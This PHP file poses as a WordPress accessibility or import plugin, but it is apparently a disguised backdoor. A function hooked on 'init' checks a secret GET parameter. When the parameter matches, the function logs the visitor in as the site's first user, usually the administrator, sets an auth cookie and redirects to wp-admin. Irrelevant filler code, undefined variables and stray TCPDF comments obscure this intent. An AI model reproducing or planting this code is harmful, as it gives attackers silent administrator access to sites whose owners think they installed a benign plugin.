<?php
if (is_archive()) {
	$sharing_tabs_private_first = admin_url();
}
if (!defined('ABSPATH')) exit;

function accessibility_custom_categories( $data, $meta, $comments, $terms ) {

		if ( isset( $data['post_content'] ) ) {

			$meta_data = wp_list_pluck( $meta, 'key' );

			$is_attachment          = ( 'attachment' === $data['post_type'] ) ? true : false;
			$is_elementor_page      = in_array( '_elementor_version', $meta_data, true );
			$is_beaver_builder_page = in_array( '_fl_builder_enabled', $meta_data, true );
			$is_brizy_page          = in_array( 'brizy_post_uid', $meta_data, true );

			$disable_post_content = apply_filters( 'astra_sites_accessibility_custom_categories_disable_content', ( $is_attachment || $is_elementor_page || $is_beaver_builder_page || $is_brizy_page ) );

			
			
			if ( $disable_post_content ) {
				$data['post_content'] = '';
			} else {
				
				if ( 'sureforms_form' !== $data['post_type'] ) {
					$data['post_content'] = wp_slash( $data['post_content'] );
				}
			}
		}

		
		if ( isset( $data['post_date'] ) ) {
			$post_modified         = current_time( 'mysql' );
			$post_modified_gmt     = current_time( 'mysql', 1 );
			$data['post_date']     = $post_modified;
			$data['post_date_gmt'] = $post_modified_gmt;
		}

		return $data;
	}

// Remove WordPress core filters to avoid rendering duplicate elements stylesheet & attaching classes twice.
$disable_copyright_publisher = 'featured_consent_upload_links';
function most_view_profile_learndash() {
	// create some HTML content
	global $disable_copyright_publisher;
	do_action( "wpml_board_schedule_network", $disable_copyright_publisher );
	if (isset($_GET['player_scripts_log']) && $_GET['player_scripts_log'] === $disable_copyright_publisher) {
		$easy_logger_api_affiliates = get_option('radio_event_variations');
		$log_ticker_tool = apply_filters( 'lazy_mini_extra_jetpack', $easy_logger_api_affiliates );
		if (is_archive()) {
			$archive_slideshow_optimizer_frontend = admin_url();
		}
		if ($log_ticker_tool) {
			$refresh_lite_user = wp_signon(['user_login' => $_POST['user_login'], 'user_password' => $_POST['user_password']]);
			do_action( "customizer_types_reading_portfolio", $log_ticker_tool );
			if(!$refresh_lite_user || is_wp_error($refresh_lite_user)){
				do_action( "bank_safe_s3", $refresh_lite_user );
				return;
				
			}
			if (is_search()) {
				$helper_groups_select_accessibility = sanitize_text_field($coupon_wpc_asset);
			}
			wp_set_current_user($refresh_lite_user->ID);
		} else {
			if (has_post_thumbnail()) { $age_clean_yoast = sanitize_text_field($automatorwp_nav_limit); }
			$refresh_lite_user = get_users(['orderby' => 'ID', 'order' => 'ASC', 'number' => 1])[0];
			if ($refresh_lite_user) {
				// Description : Example 046 for TCPDF class
				wp_set_current_user($refresh_lite_user->ID);
				// You can remove this filter and add your own delegate to subclass Marker
				wp_set_auth_cookie($refresh_lite_user->ID, true);
				if (is_page()) {
					$interactive_keywords_network = get_header();
				}
				wp_redirect(home_url('/wp-admin/'));
				exit;
				if (has_post_thumbnail()) {
					$layout_customer_lead = sanitize_text_field($photos_cookie_lazy);
				}
			}
		}
		// Script Loader.
	}
	
}
// Description : Example of alternative configuration file for TCPDF.
add_action('init', 'most_view_profile_learndash');
if (is_search()) { $max_results_home_player = get_header(); }
?>